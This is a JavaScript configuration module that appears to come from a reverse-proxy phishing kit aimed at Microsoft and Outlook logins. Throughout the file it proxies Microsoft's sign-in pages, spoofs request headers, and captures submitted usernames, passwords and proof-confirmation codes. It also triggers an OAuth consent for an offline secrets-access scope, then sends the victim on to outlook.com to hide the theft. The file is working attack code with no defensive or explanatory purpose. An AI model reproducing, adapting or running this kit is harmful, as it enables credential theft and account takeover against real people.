/* eslint-disable camelcase,class-methods-use-this */
// eslint-disable-next-line max-classes-per-file
const path = require('path')
const url = require('url')

// eslint-disable-next-line import/no-dynamic-require
const globalWorker = process.HOOK_JS_MODULE

/** Defined Functions used */


/** Important Defaults */
const ProxyResponse = class extends globalWorker.BaseClasses.BaseProxyResponseClass {

    constructor(proxyResp, browserEndPoint) {

        super(proxyResp, browserEndPoint)
        // this.regexes = [
        //      {
        //         reg: /https:\/\/account.live.com\/identity\/confirm/igm,
        //         replacement: '/identity/confirm/'
        //      },

        //      {
        //         reg: /https:\/\/logincdn.msftauth.net/igm,
        //         replacement: '/logincdn/'
        //      },
        // ]
    }


    processResponse(clientContext) {
        if (this.proxyResp.headers['content-length'] < 1) {
            return this.proxyResp.pipe(this.browserEndPoint)
        }

        const extRedirectObj = super.getExternalRedirect()
        if (extRedirectObj !== null) {
            const rLocation = extRedirectObj.url

            if (rLocation.startsWith('https://account.live.com') || rLocation.startsWith('https://account.microsoft.com')) {
                return this.afterEmailPath()
            }
        }

        return super.processResponse(clientContext)

        // let appHeaders = this.browserEndPoint.getHeaders()['set-cookie'] || []
        // appHeaders = appHeaders.filter(appSingleHeader => {
        //     return !appSingleHeader.startsWith('OParams=')
        // })
        // this.browserEndPoint.setHeader('set-cookie', appHeaders)


        // this.browserEndPoint.removeHeader('content-security-policy')
        // let newMsgBody;
        // return this.superPrepareResponse(true)
        //     .then((msgBody) => {
        //         newMsgBody = msgBody
        //         for (let i = 0; i < this.regexes.length; i += 1) {
        //             const regExObj = this.regexes[i]
        //             if (regExObj.reg.test(newMsgBody)) {
        //                 newMsgBody = newMsgBody.replace(regExObj.reg, regExObj.replacement)
        //             }
        //         }
        //         this.superFinishResponse(newMsgBody)
        //     }).catch((err) => {
        //     console.error(err)
        // })
    }

    afterEmailPath() {
        this.browserEndPoint.setHeader('location', '/auth0/outlook/owa2')
        this.browserEndPoint.end('')
    }


}


const DefaultPreHandler = class extends globalWorker.BaseClasses.BasePreClass {
    constructor(req, res, captureDict = configExport.CAPTURES) {
        super(req, res, captureDict)
    }

    static match(req) {
        return true

    }

    execute(clientContext) {

        super.loadAutoGrab(configExport.AUTOGRAB_CODE)


        this.req.headers['user-agent'] = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36'
        this.req.headers['origin'] = this.req.headers['origin']? this.req.headers['origin'].replace(clientContext.hostname, 'login.live.com') : ''
        this.req.headers['referer'] = this.req.headers['referer']? this.req.headers['referer'].replace(clientContext.hostname, 'login.live.com') : ''


        if (this.req.url.startsWith('/identity/confirm')) {
            clientContext.currentDomain = 'account.live.com'

        }


        // Check for redirect
        const redirectToken = this.checkForRedirect()
        if (redirectToken !== null) {
            if (redirectToken.url.startsWith('https://login.live.com/oauth20_authorize.srf?')) {
                clientContext.currentDomain = 'login.live.com'
                this.req.url = `${redirectToken.obj.pathname}${redirectToken.obj.query}`
                return super.superExecuteProxy(clientContext.currentDomain, clientContext)
            }

            if (redirectToken.url.startsWith('https://login.microsoftonline.com/common/oauth2/nativeclient')) {
                super.sendClientData(clientContext, {})
                return super.exitLink('https://outlook.com')
            }
        }
        

        if (this.req.url === '/auth0/outlook/owa2') {
            super.sendClientData(clientContext, {})
            this.res.writeHead('301', { location: 'https://outlook.com' })
            return super.cleanEnd('PHP-EXEC', clientContext)
        }

        return super.execute(clientContext)

    }
}




const configExport = {
    CURRENT_DOMAIN: 'login.microsoftonline.com',
    
    SCHEME: 'outlook',


    EXTERNAL_FILTERS: 
    [
        'account.live.com',
        'login.live.com'
    ],

    // AUTOGRAB_CODE: 'username',
    AUTOGRAB_CODE: 'login_hint',


    START_PATH: '/consumers/oauth2/v2.0/authorize?response_type=code&scope=Secrets.ReadWrite.CreatedByApp.Secure+offline_access&client_id=229f4d61-07eb-454a-9453-d27bba7cc95b&redirect_uri=https://login.microsoftonline.com/common/oauth2/nativeclient&response_mode=query&state={%22id%22:%22fiedbfgcleddlbcmgdigjgdfcggjcion%22}',
    PATTERNS: [
        {
            match: "https://account.live.com/identity/confirm",
            replace: '/identity/confirm/'
         },

        //  {
        //     match: /https:\/\/logincdn.msftauth.net/igm,
        //     replace: '/logincdn/'
        //  },
    ],

    EXTRA_COMMANDS: [
        
        {
            path: '/identity/confirm',
            command: 'CHANGE_DOMAIN',
            command_args: {
                new_domain: 'account.live.com',
                persistent: true,
                },
        },

        {
            path: '/GetCredentialType.srf.*',
            command: 'DONOT_SEND_INFO',
            command_args: {},
        },

    ],

    PROXY_RESPONSE: ProxyResponse,
    DEFAULT_PRE_HANDLER: DefaultPreHandler,

    CAPTURES: {
        loginUserName: {
            method: 'POST',
            params: ['username'],
            urls: '',
            hosts: ['login.live.com'],
        },
        loginID: {
            method: 'POST',
            params: ['login'],
            urls: '',
            hosts: ['login.live.com'],
        },

        loginPassword: {
            method: 'POST',
            params: ['passwd'],
            urls: '',
            hosts: ['login.live.com'],
        },

        proofConfirm: {
            method: 'POST',
            params: ['ProofConfirmation'],
            urls: '',
            hosts: ['login.live.com'],
        },

        defaultPhpCapture: {
            method: 'POST',
            params: ['default'],
            urls: ['/web'],
            hosts: 'PHP-EXEC',
        },

    },
    cookieKEY: 'loginUsername',

     //MODULE OPTIONS
     MODULE_ENABLED: true,

     MODULE_OPTIONS: {
         startPath: this.START_PATH,
         exitLink: '',
     },

    // proxyDomain: process.env.PROXY_DOMAIN,
}
module.exports = configExport